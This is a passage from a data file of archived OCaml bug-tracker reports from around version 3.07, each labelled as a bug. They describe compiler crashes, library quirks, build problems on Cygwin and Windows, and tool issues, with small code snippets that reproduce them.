err.ml\n\nBest Regards,\nArtem Prysyznuk\n"},{"labels":["bug"],"text":"**Original bug ID:** 1934\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nSalut,\n\nI'm building Ocaml 3.07pl2 on Debian woody.  I'm editing under emacs\n21.2.\n\nThe file emacs/caml-font.el contains at the beginning color changes\nthat:\n\n* [wishlist] are a poor choices for a dark background, i.e. emacs's\n             (background-mode . dark);\n\n* [bug]      make global changes to the colors in *all* other buffers.\n\n(I just delete the entire block before building.)\n\n-James\n"},{"labels":["bug"],"text":"**Original bug ID:** 1933\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nSalut,\n\nI'm building Ocaml 3.07pl2 on Debian woody with make warnings turned\non\n\n   alias make='make --warn-undefined-variables'\n\nI see that GENERATORS and TKANIM_LIB are both undefined when doing\nmake opt. They occur here:\n\n./otherlibs/labltk/tkanim/Makefile:animwish: $(TKANIM_LIB) tkAppInit.o\n./otherlibs/labltk/tkanim/Makefile.nt:# animwish: $(TKANIM_LIB) tkAppInit.o\n./ocamldoc/Makefile:    $(CP) ocamldoc.hva *.cmi $(GENERATORS) $(OCAMLDOC_LIBCMA) $(INSTALL_LIBDIR)\n./ocamldoc/Makefile.nt: $(CP) ocamldoc.hva *.cmi $(GENERATORS) $(OCAMLDOC_LIBCMA) $(INSTALL_LIBDIR)\n\nThis appears not to interfere with building so is not serious.  In\ngeneral, though, undefined Makefile variables lead to Trouble. 8-)\n\nAmicalement,\n -James\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1932\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for Caml light use https://github.com/camllight/camllight/issues\n\n## Bug description\n\nFull_Name: John Harrison\nVersion: Caml Light 0.75\nOS: Windows XP + Cygwin\nSubmission from: jffwpr01.jf.intel.com (134.134.136.1)\n\n\nHas anyone built Caml Light under Cygwin? OCaml compiles without problems but I\nhave severe problems with Caml Light 0.75. This is the latest Cygwin under\nWindows\nXP.\n\n0. A relatively minor first problem in \"src/runtime\", a type inconsistency\nbetween \"sys_errlist\" in sys.c and standard header errno.h. But it was only the\naddition of \"const\" qualifiers so I modified sys.c accordingly.\n\n1. After building inside \"src/runtime\", the subsequent copy of \"camlrun\" fails:\n  \n cp: `runtime/camlrun' and `./camlrun' are the same file\n\nThis may be something to do with Cygwin's weird phantom \"exe\" extensions.\nAnyway\nI just copied runtime/camlrun.exe to camlrun instead, and dealt with an\nidentical\nproblem in the following \"yacc\" build in the same way.\n\n2. Stranger still, the build inside \"lib\" fails early:\n\n ../camlrun ../camlcomp -stdlib . -O none -g -W arg.mli\n Fatal error: the file ../camlcomp is not a bytecode executable file\n\nAs far as I can see from the source, this means an unexpected magic number, but\nthe file (according to \"od\") does end with \"CL07\" as expected. I didn't delve\ndeeper. Any suggestions?\n\nJohn.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1931\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi\n   I found that Arg module will always print more than what i want.\n   For example\n  some code:\n\nlet main () =\n  let speclist = [\n    (\"-t\", Arg.String( print_endline) ,\n        \"File types \");\n    (\"-v\", Arg.String(print_endline) ,\"show version information\");\n  ] in\n  let ano_fun  s =\n    print_endline \"Default\"\n  in\n  Arg.parse speclist ano_fun \"command [-t type] [-v string] \"\n\n\nlet _ =\n  main();;\n\n\nafter complie as output   ptk\nwhen i type\n./ptk -t\nit will print the error message 3 time !\n\n[climb@lcgfdr prj]$ ./ptk -t\n./ptk: option `-t' needs an argument.\ncommand [-t type] [-v string]\n  -t File types\n  -v show version information\n  -help   Display this list of options\n  --help  Display this list of options\n./ptk: ./ptk: option `-t' needs an argument.\ncommand [-t type] [-v string]\n  -t File types\n  -v show version information\n  -help   Display this list of options\n  --help  Display this list of options\n.\ncommand [-t type] [-v string]\n  -t File types\n  -v show version information\n  -help   Display this list of options\n  --help  Display this list of options\n\n\n\nand  when i type\n./ptk -t -v\nit will print  -v.\nit will not print any error mesage.\nhowever at this situation ,  it is a error input of args\n\nSince i am new to Arg module ,  i am not quite sure is it a bug or not.\nIf not a bug,  can you tell me how to avoid it ?\n\nclimb\n"},{"labels":["bug"],"text":"**Original bug ID:** 1930\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Josef Svenningsson\nVersion: 3.07pl2\nOS: Solaris7\nSubmission from: muppet90.cs.chalmers.se (129.16.228.10)\n\n\nI just want to say that bug #1869 is still there in the patchlevel 2\ndistribution.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1928\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Guillaume Marceau\nVersion: 3.07+2\nOS: Gentoo Linux\nSubmission from: 128.148.206.106 (128.148.206.106)\n\n\nThe ocamlcp pretty-printer uses the arr.(0) syntax sugar to access Array.get and\nArray.set. Unfortunatly, this breaks when the source code redirected the sugar\nto some other module than the standard Array, for intance, to extLib's\nDynArray.\n\n\ngmarceau@canuk cytometry $ cat test.ml\nmodule Array = DynArray\n\nlet foo i = match i with _ -> (DynArray.create ()).(0) \n        \ngmarceau@canuk cytometry $ ocamlc -I ~/lib/ocaml-extlib/ extLib.cma test.ml \n\ngmarceau@canuk cytometry $ ocamlcp -I ~/lib/ocaml-extlib/ extLib.cma test.ml \nFile \"/tmp/camlpp51563a\", line 3, characters 31-53:\nThis expression has type int array but is here used with type\n  'a Array.t = 'a DynArray.t\n"},{"labels":["bug"],"text":"**Original bug ID:** 1923\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nJ'utilise un programme utilisant ocaml, mais il paraÃ®t que le langage\nocaml ne peut pas gÃ©nÃ©rer de segmentation fault. Donc tous les bugs\nconcernant les \"segmentation fault\" doivent Ãªtre redirigÃ© vers vous.\n\nJ'utilise mldonkey, avec gcc-3.3.2 et libc6 2.3.2.ds1 (linux debian).\nPour trouver plus prÃ©cisÃ©ment l'endroit oÃ¹ Ã§a plante, j'ai utilisÃ©\nelectric-fence et gdb.\n\nJ'ai donc des segmentation fault dans:\nHashlbl__do_bucke_157()\net\ncompact_allocate()\n\nCordialement,\n"},{"labels":["bug"],"text":"**Original bug ID:** 1922\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n------------------------\nexemple de source:\n------------------------\n\nlet print_info = fun s -> \n  begin\n    print_char '(';\n    print_int (Unix.getpid ());\n    print_string \") \";\n    print_string s\n  end;;\n\nlet f = fun () ->\n  begin\n    print_info \"=====> f ()\\n\";\n    match Unix.fork() with\n    | 0 -> \n\tbegin\n\t  print_info \"Fils\\n\";\n\t  exit 0;\n\t  failwith \"sortie du fils\"\n\tend\n    | _ -> \n\tbegin\n\t  ignore (Unix.wait ());\n\t  print_info \"Pere\\n\"\n\tend\n  end;;\n\nprint_info \"Debut\\n\";;\nf ();;\nprint_info \"Fin\\n\";;\n\n---------------\ncompilation:\n---------------\nocamlc unix.cma test.ml -cclib -linux -o t\n\n----------\nversion:\n----------\nocaml 3.06 (mandrake 9.1)\n\n------------\nexecution:\n------------\n(3741) Debut\n(3741) =====> f ()\n(3742) Fils\n(3741) Debut\n(3741) =====> f ()\n(3741) Pere\n(3741) Fin\n\n------------------\nCommentaires:\n------------------\nLe pere s execute une seconde fois Ã  chaque appel de Unix.fork, alors qui si \non pend un code similaire en C il se comporte normalement (cad qu il ne s \nexecute qu une seule fois).\n\nJe suis tres curieux de comprendre ce qu'il se passe mais aussi de trouver un \nmoyen d eviter ce probleme.\n\nMerci d avance.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1921\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nI just found out something which I don't know if it should be qualified as a\nbug or not: take a look at toy-min.ml. It compiles fine with ocaml 3.06, and\nworks as expected, but fails with ocaml 3.07.\nThis is a toy example based on a 47Ko source file (!), which compiled fine\nwith 3.06 but not with the new version. \n\nThe toy.ml file is the syntactic equivalent of this source file, though you\nmight prefer to take a look at toy-min.ml instead.\n\nThe reason why I hope :-) it is a bug, is that the incriminated source file is\ngenerated automatically, and understanding how to correct it would cause me\nheadaches ;-).\n\nI looked for the cause of this incompatibility, and saw that there had been\nsome changes in check_recursive_lambda of bytecomp/translcore.ml. \n\nSo I attempted to get the lambda term that caused the problem, so as to unroll\nmanually the check_recursive_lambda function, but I saw that when there was an\nsyntactic error, the lambda term was not dumped (while the parse tree was). So\nmaybe changing the order of function calls in driver/compile.ml would be a\ngood idea (but I dunno, I didn't attempt to see if the order was important or\nnot).\n\nThanks in advance.\n\n----------------\n\n\nlet rec recData=\n  let module SomeModule=\n    struct \n\n      let callRecData x=\n\tif x<=0\n\tthen 1\n\telse ((fst recData) (x-1)) * x\n\n      let mk_double x=2 * x\n\n    end\n  in \n    (SomeModule.callRecData, SomeModule.mk_double)\n\n\nlet _=\n  let test=(snd recData) ((fst recData) 5) in\n    print_int test\n----------------\n\n\n\nmodule type DummyType=\nsig\n  type t\n\n  val mk_id : t -> t\nend\n\nmodule MakeModule=\n  functor(M:DummyType) ->\nstruct \n  let fun1 a= M.mk_id a\n  let fun2 a= M.mk_id a\nend\n\n\nlet first (t,_,_)=t\nlet second (_,t,_)=t\nlet third (_,_,t)=t\n\nlet treatment x=x\nlet callsthg x=x\n\nlet rec recData=\n  let useRecData x=callsthg (second recData x) in\n  let module SomeModule=\n    struct \n      type t=int\n\n      let rec useUser somefun what=\n\tmatch what with\n\t  | None -> what\n\t  | Some(_:int) -> treatment (useUser useRecData None)\n\n      let callRecData x=\n\tfirst recData x\n\n      let mk_id x=x\n\n    end\n  in \n\n  let module UserModule=MakeModule(SomeModule) in\n    (UserModule.fun1, UserModule.fun2, SomeModule.useUser)\n\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1918\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Damien Pous\nVersion: 3.07\nOS: Debian/GNU Linux (testing/unstable)\nSubmission from: mailhost.ens-lsh.fr (193.51.131.2)\n\n\nThe following type declaration raise an Assert_failure exception \nwithin the compiler (ocamlc, ocamlopt, toplevel) :\n\n<<\n# type ('a, 'b) a = 'a -> unit constraint 'a = [> `B of ('a, 'b) b as 'b] \n  and  ('a, 'b) b = 'b -> unit constraint 'b = [> `A of ('a, 'b) a as 'a];;\n  Fatal error: exception Assert_failure(\"typing/typedecl.ml\", 317, 38)\n>>\n\nthis bug can also be trigered by the simpler but incorrect following type\n\n<<\n# type 'a a = 'a constraint 'a = [> `B of 'b b as 'b]\n  and  'b b = 'b -> unit;;\n  Fatal error: exception Assert_failure(\"typing/typedecl.ml\", 317, 38)\n>>\n"},{"labels":["bug"],"text":"**Original bug ID:** 1917\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Damien Pous\nVersion: 3.07\nOS: Debian/GNU Linux (testing/unstable)\nSubmission from: mailhost.ens-lsh.fr (193.51.131.2)\n\n\nthe following code produces a Stack overflow at compile time \n(ocamlc, ocamlopt, toplevel)\n\n<<\nclass type ['a, 'b] a = object\n  method b: ('a, 'b) #b as 'b\n  method as_a: ('a, 'b) a\nend and ['a, 'b] b = object\n  method a: ('a, 'b) #a as 'a\n  method as_b: ('a, 'b) b \nend\n\nclass type ['b] ca = object ('s) inherit ['s, 'b] a end\nclass type ['a] cb = object ('s) inherit ['a, 's] b end\n\t  \ntype bt = 'b ca cb as 'b\n>>\n\nrenaming methods as_a and as_b to the same name \"fix\" it...\n"},{"labels":["bug"],"text":"**Original bug ID:** 1916\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Lukasz Lew\nVersion: 3.02 - 3.07\nOS: Win / Lin\nSubmission from: fw-gw-atm.mimuw.edu.pl (193.0.96.15)\n\n\nJust run code below:\nlet s a = match a with\n  | false, false, false -> \"1\"\n  | false, false, true-> \"2\"\n  | false, true,  fasle -> \"3\"\n  | false, true,  true -> \"4\" \n  | true,  false, fasle -> \"5\" \n  | true,  fasle, true -> \"6\"\n  | true,  true,  fasle -> \"7\"\n  | true,  true,  true -> \"8\" \n  | _ -> \"none\"\n;;\nlet f = false;;\nlet t = true;;\nlet all = [(f,f,f); (f,f,t); (f,t,f); (f,t,t); \n           (t,f,f); (t,f,t); (t,t,f); (t,t,t)]\n;;\nList.iter (fun tri -> print_endline (s tri)) all;;\n\nCompilation output:\nFile \"t.ml\", line 5, characters 4-22:\nWarning: this match case is unused.\nFile \"t.ml\", line 9, characters 4-22:\nWarning: this match case is unused.\nFile \"t.ml\", line 10, characters 4-5:\nWarning: this match case is unused.\n\nProgram output : \n1\n2\n3\n3\n5\n5\n7\n6\n\nIs it a know bug?\nRegards\nLukasz Lew\n"},{"labels":["bug"],"text":"**Original bug ID:** 1915\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Lukasz Lew\nVersion: 3.02 - 3.07\nOS: Win / Lin\nSubmission from: fw-gw-atm.mimuw.edu.pl (193.0.96.15)\n\n\nJust run code below:\nlet s a = match a with\n  | false, false, false -> \"1\"\n  | false, false, true-> \"2\"\n  | false, true,  fasle -> \"3\"\n  | false, true,  true -> \"4\" \n  | true,  false, fasle -> \"5\" \n  | true,  fasle, true -> \"6\"\n  | true,  true,  fasle -> \"7\"\n  | true,  true,  true -> \"8\" \n  | _ -> \"none\"\n;;\nlet f = false;;\nlet t = true;;\nlet all = [(f,f,f); (f,f,t); (f,t,f); (f,t,t); \n           (t,f,f); (t,f,t); (t,t,f); (t,t,t)]\n;;\nList.iter (fun tri -> print_endline (s tri)) all;;\n\nCompilation output:\nFile \"t.ml\", line 5, characters 4-22:\nWarning: this match case is unused.\nFile \"t.ml\", line 9, characters 4-22:\nWarning: this match case is unused.\nFile \"t.ml\", line 10, characters 4-5:\nWarning: this match case is unused.\n\nProgram output : \n1\n2\n3\n3\n5\n5\n7\n6\n\nIs it a know bug?\nRegards\nLukasz Lew\n"},{"labels":["bug"],"text":"**Original bug ID:** 1914\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #8395\n\n## Bug description\n\nFull_Name: GaÃ©tan Richard\nVersion: 3.07+2\nOS: Linux/Debian\nSubmission from: 140.77.128.157 (140.77.128.157)\n\n\nBonjour,\n\nJe suis en train d'essayer d'interfacer samba en OCaml et je rencontre le\nproblÃ¨me suivant : \n\nLors de l'execution de ocamlc -custom ou de ocamlopt, le code c produit exporte\nde nombreuses fonctions (par exemple sys_open ou string_set).\n\nCes fonctions entrainent des problÃ¨me avec la librairie samba.\n\nSerait-il possible que ces fonctions soient dÃ©finies comme statiques dans le\ncode c produit ?\n\nMerci,\n\nGaÃ©tan\n"},{"labels":["bug"],"text":"**Original bug ID:** 1906\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Artem Prysyanuk\nVersion: 3.07+2\nOS: RedHat 9\nSubmission from: 213.156.75.17.priocom.com (213.156.75.17)\n\n\n$ ocamlc -version\n  3.07+2\n$ camlp4o -v\n  Camlp4 version 3.07+2\n$ cat a.ml\n  let test () =\n        raise Not_found;;\n  test ();;\n$ export OCAMLRUNPARAM=b\n\nWithout camlp4 all ok.\n\n$ ocamlc -g a.ml\n$ ./a.out\n  Fatal error: exception Not_found\n  Raised at file \"a.ml\", line 2, character 16\n  Called from file \"a.ml\", line 3, character 7\n\nBut if I use camlp4o, output after exception:\n\n$ ocamlc -pp camlp4o -g a.ml\n$ ./a.out\nFatal error: exception Not_found\nRaised at file \"\", line 1, character 31\nCalled from file \"\", line 1, character 41\n\nSo, file names and line numbers are missing.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1903\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Vladimir TÃ¡mara PatiÃ±o\nVersion: 3.07\nOS: OpenBSD\nSubmission from: gateway1-theorie.informatik.uni-kl.de (131.246.16.250)\n\n\nif (Str.string_match (Str.regexp \"^[ -0-9]*$\") \"41\" 0) then\n        print_endline (\"Here enters with Ocaml 3.06\")\nelse\n        print_endline (\"And here with Ocaml 3.07\")\n\n(* Works fine in both with ^[- 0-9]*$   *)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1897\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Hugo Herbelin\nVersion: 3.07\nOS: linux\nSubmission from: herbelin.net1.nerim.net (62.212.105.93)\n\n\n\n  Chers developpeurs,\n\n  This is not really a bug but ocamldebug 3.07 behaves differently has\n3.06 wrt load_printer, and since it is not mentioned in the Changes\nfile and it induces renaming of our files, we'd like to know if it is\nintended or not. Thanks in advance (our apologies if this is a\nknown change or if it has already been reported).\n\n  - We have a file named symbols.ml which apparently now conflicts\nwith the eponymous file from the ocaml distribution.\n\n    Error during code loading: interface mismatch on Symbols\n\n  After renaming of our file, it goes well.\n\n  - In ocaml 3.06, load_printer was recursive. It is apparently not\nthe case any longer et we have to explicitly load all needed .cmo\n(or .cma). Is is intended, typically to solve another problem?\n\n  Besides, I haven't closely look at all the novelties of ocaml 3.07,\nbut we particularly appreciate the fact that the .cmo of files of\nwhich the only compilation dependency was in types are no longer\nrequired in .cma. Thanks.\n\n  Hugo\n"},{"labels":["bug"],"text":"**Original bug ID:** 1896\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe following program does not work on Windows:\n\n<snip>\nopen Printf\n\nlet main =\n  let outchnl = Unix.open_process_out \"../fpasm.exe\" in\n  ()\n</snip>\n\nUnix.open_process_out reports:\n\n\"'..' is not recognized as an internal or external command,\noperable program or batch file.\"\n\nWhich apparently comes from cmd.exe.  If I replace the slash with a\nbackslash the open_process_out call works as expected.\n\nObviously I don't want to start using backslashes in my paths when\nrunning on Windows.  Could this be fixed automatically?  It is my\nunderstanding that OCaml does these conversions for some library\nfunctions.\n\nBest regards,\nJanne Hellsten\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1894\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n\n## Bug description\n\nFor example,\n\n[--- test.idl---]\nvoid f([in,bigarray,size_is(len)] const int* c, int len);\n[--- end of test.idl ---]\n\ndoes not compile, causing an exception in camlidl:\n\nFatal error: exception Assert_failure(\"cvttyp.ml\", 5064, 5076)\n\nIf \"const\" attribute is not acceptable for bigarrays, this case\nprobably should be handled more carefully.\n\n- Dmitry Bely\n"},{"labels":["bug"],"text":"**Original bug ID:** 1892\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nJ'ai installÃ© un peu en vrac Cygwin et MinGW pour essayer de compiler\nOCaml sur une machine Windows. Au moment de construire stdlib.cmxa,\nj'ai une erreur:\n\n../boot/ocamlrun ../ocamlopt -a -o stdlib.cmxa pervasives.cmx array.cmx\nlist.cmx\n char.cmx string.cmx sys.cmx hashtbl.cmx sort.cmx marshal.cmx obj.cmx\nint32.cmx\nint64.cmx nativeint.cmx lexing.cmx parsing.cmx set.cmx map.cmx stack.cmx\nqueue.c\nmx stream.cmx buffer.cmx printf.cmx format.cmx scanf.cmx arg.cmx\nprintexc.cmx gc\n.cmx digest.cmx random.cmx camlinternalOO.cmx oo.cmx genlex.cmx\ncallback.cmx wea\nk.cmx lazy.cmx filename.cmx complex.cmx arrayLabels.cmx listLabels.cmx\nstringLab\nels.cmx moreLabels.cmx stdLabels.cmx\nar: @c:\\tmp\\camlresp90eda2: Invalid argument\nError while creating the library stdlib.a\nmake[1]: *** [stdlib.cmxa] Error 2\n\nC'est le ar de MinGW. Si je mets /bin avant /cygdrive/c/MinGW dans le\nPATH, pour utiliser le ar de Cygwin, Ã§a a l'air de marcher.\n\nSi j'enleve suffisament de .cmx sur la ligne de commande ci-dessus, ca\npasse aussi avec le ar de MinGW. Ca doit etre un problÃ¨me avec les\nresponse files.\n\nEst-ce que c'est un problÃ¨me connu?\n\nPour info:\n$ /cygdrive/c/MinGW/bin/ar --version\nGNU ar 2.13.90 20030111\nCopyright 2002 Free Software Foundation, Inc.\nThis program is free software; you may redistribute it under the terms of\nthe GNU General Public License.  This program has absolutely no warranty.\n\n$ /bin/ar --version\nGNU ar 2.13.90 20030308\nCopyright 2002 Free Software Foundation, Inc.\nThis program is free software; you may redistribute it under the terms of\nthe GNU General Public License.  This program has absolutely no warranty.\n\n\nSinon, le README.win32 ne dit meme pas qu'il faut avoir MinGW installÃ©;\nc'est un oubli?\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1888\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: James J. Leifer\nVersion: 3.07\nOS: linux\nSubmission from: www-rocqbis.inria.fr (192.93.2.12)\n\n\nSalut,\n\nThe -o option in ocamllex has no effect, contrary to the doc.\n\nIt looks like in lex/main.ml the line\n\n    \"-o\", Arg.String (fun x -> source_name := Some x),\n\nshould read\n\n    \"-o\", Arg.String (fun x -> output_name := Some x),\n"},{"labels":["bug"],"text":"**Original bug ID:** 1887\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nSoit le code source suivant:\n##################################################\nlet send fd mes =\n  let m=(String.sub mes 0 8) in\n      Unix.send fd m 0 8 []\n      \n(* chaque client qui se connecte recoit dix messages\nsuccessifs *)\nlet loop_client (fd,addr)=\n     let i = ref 0 in\n        while (!i<10) do\n          Thread.delay 1.;\n          send fd (\"message\"^(string_of_int !i));\n          i:=!i+1\n        done \n    \nlet start port_num =\n  let sock = Unix.socket Unix.PF_INET Unix.SOCK_STREAM\n0 in\n      let sock_addr =\nUnix.ADDR_INET(Unix.inet_addr_any, port_num) in \n      (\n        Unix.bind sock sock_addr ;\n        Unix.listen sock 12;\n        \n        while true do\n            let (service_sock, client_sock_addr) =\nUnix.accept sock in\n                Thread.create loop_client\n(service_sock,client_sock_addr)\n        done\n      )\n\nlet _=\n  start 3500 ;\n##################################################\n\nJ'utilise Ocaml 3.06 sur Mac OSX, freeBSD, une\nMandrake (un peu pÃ©rimÃ©e) linux.\nJe compile ce code avec ocamlc sur ces OS, et le teste\navec telnet.\nLe comportement que j'en attend est que le client\ntelnet recoive successivement 10 messages du serveur\nmais Ã§a ne se produit que sous freeBSD. Avec les\nautres OS, le client telnet ne recoit rien.\nAyant connaissance d'un ancien problÃ¨me de\ncompatibilitÃ© des appels systÃ¨mes Unix avec les\nthread, j'ai essayÃ© en utilisant la desormais inutile\nbibliothÃ¨que Threadunix Ã©videmment sans succes.\nJ'ai egalement essaye en remplacant Unix.send par\nUnix.write, et de forcer le flush sur le descripteur\nen utilisant un canal, sans succes.\nJe suis Ã  court d'idÃ©es, et Ã  court d'informations sur\nl'implÃ©mentation des threads pour comprendre cette\ndiffÃ©rence de comportement.\n\nSi jamais il ne s'agit pas d'un bug ou puis-je trouver\nles informations nÃ©cessaires pour faire fonctionner ce\ntype de code comme je l'attend sous mac OSX?\n\nCordialement,\n\nAnne-Gwenn Bosser\n\n\n__________________________________\nDo you Yahoo!?\nThe New Yahoo! Shopping - with improved product search\nhttp://shopping.yahoo.com\n"},{"labels":["bug"],"text":"**Original bug ID:** 1886\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n#1 Camlp4 syntax extension pa_ocamllex\npa_ocamllex does not support rules with formal parameters. I removed my \npa_ocamllex code from the module where it was embedded and placed it \ninto a .mll file, which was then compiled with ocamllex without any problem.\n\nHere is the code as it appears now in xcaml_lexer.mll. Previously, all \n'let' and 'rule' bindings were prefixed by the pa_ocamllex keyword.\nlet dollar = \"\\\\$\"\nlet base_char = [^'$''\\n''<']\nlet base_text = (base_char | dollar | ('<' [^'?'])) +\nlet xcaml_char = [^'$''\\n''>''?']\nlet xcaml_text = (xcaml_char | dollar | ('?' [^'>']) )+\nlet dollar_expr_char = [^'\\n'')']\nlet dollar_expr_text = (dollar_expr_char | (')' [^'$']) )+\nlet eol = '\\n'\nlet white_char = [' ''\\t''\\r']\nlet white = white_char +\nlet id = ['A'-'Z''a'-'z''0'-'9''-''_''.']+\n\nrule base_lexer accu line = parse\n| (white eol) as newline { [< 'Base(newline); base_lexer accu (succ \nline) lexbuf >] }\n| \"<?xcaml\"              { [< stream_of_queue accu; 'Line(line); \nxcaml_lexer line lexbuf >] }\n| base_text as base_line { [< 'Base(base_line); base_lexer accu line \nlexbuf >] }\n| '$' (id as name)       { Queue.add (Dollar(dollar_var name)) accu; [< \n'Base(\"%s\"); base_lexer accu line lexbuf >] }\n| \"$#\" (id as name)      { Queue.add (Dollar(hash_var name)) accu; [< \n'Base(\"%s\"); base_lexer accu line lexbuf >] }\n| \"$!\" (id as name)      { Queue.add (Dollar(bang_var name)) accu; [< \n'Base(\"%s\"); base_lexer accu line lexbuf >] }\n| \"$(\"                   { let code, line = dollar_expr_lexer line \n(Buffer.create 128) lexbuf in\n\t\t\t     Queue.add (Line(line)) accu;\n\t\t\t     Queue.add (Dollar(code)) accu;\n\t\t\t     [< 'Base(\"%s\"); base_lexer accu line lexbuf >] }\n\nand xcaml_lexer line = parse\n| (white eol) as newline  { [< 'Code(newline);            xcaml_lexer \n(succ line) lexbuf >] }\n| xcaml_text as code_line { [< 'Code(code_line);          xcaml_lexer \nline lexbuf >] }\n| '$' (id as name)        { [< 'Code(dollar_var name);    xcaml_lexer \nline lexbuf >] }\n| '$' (id as name) '?'    { [< 'Code(dollar_var_ex name); xcaml_lexer \nline lexbuf >] }\n| \"$#\" (id as name)       { [< 'Code(hash_var name);      xcaml_lexer \nline lexbuf >] }\n| \"$#\" (id as name) '?'   { [< 'Code(hash_var_ex name);   xcaml_lexer \nline lexbuf >] }\n| \"$!\" (id as name)       { [< 'Code(bang_var name);      xcaml_lexer \nline lexbuf >] }\n| \"$!\" (id as name) '?'   { [< 'Code(bang_var_ex name);   xcaml_lexer \nline lexbuf >] }\n| \"?>\"                    { [< 'Line(line); base_lexer (Queue.create ()) \nline lexbuf >] }\n\nand dollar_expr_lexer buf line = parse\n| (white eol) as newline { Buffer.add buf newline; dollar_expr_lexer buf \n(succ line) lexbuf  }\n| dollar_expr_text as code_line  {  Buffer.add buf code_line; \ndollar_expr_lexer buf line lexbuf  }\n| \")$\" { (Buffer.contents buf),line }\n\n\n************************************************************************\n#2 ocamlyacc does not generate correct mli files when the header and \ntrailer contain module type definitions and module implementations. I am \nattaching sample code. I realize I am using ocamlyacc for some really \nweird stuff, but given that ocamlc -i generates the correct signatures, \nadd the functionality to ocamlyacc might be worth considering.\n\nHave fun!\n\nAlex\n\n----------------\n%{\n(*\n *                       Xcaml-lib\n *                 Copyright (c) 2003 Baretta SRL\n *                 Via Lago d'Orta 3\n *                 20098 San Giuliano Milanese -- Italy\n *\n * This code is free software. You may use it, modify it,\n * and redistribute it under the terms of the\n * GNU General Public License, Version 2. You may obtain\n * a copy of this license by writing to\n *\n * Free Software Foundation, Inc.\n * 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n *\n * $Id$\n *\n *)\n\n  open Batched_queue\n  open Printf\n\n  let add buf s = Buffer.add_string buf s\n\n  let open_printf = \"printf \\\"\"\n  let open_write = \"write \\\"\"\n  let close_printf = \"\\\" \"\n  let close_write = close_printf\n\n  module type PARSER_PARAMS = sig val filename : string end\n  module type PARSER_TYPE = sig\n    val prog: (Lexing.lexbuf  -> token) -> Lexing.lexbuf -> (string -> 